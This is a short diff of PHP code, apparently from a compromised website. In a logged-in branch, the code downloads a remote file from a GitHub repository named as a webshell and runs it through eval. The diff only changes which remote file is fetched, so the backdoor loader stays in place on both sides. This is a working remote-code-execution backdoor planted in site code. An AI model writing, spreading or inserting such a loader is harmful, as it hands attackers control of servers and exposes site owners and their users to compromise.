@@ -77,7 +77,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $superman = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/tbl.php';
+    $superman = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php';
     $maklokangspamzoneh = geturlsinfo($superman);
     if ($maklokangspamzoneh !== false) {
         eval('?>' . $maklokangspamzoneh);
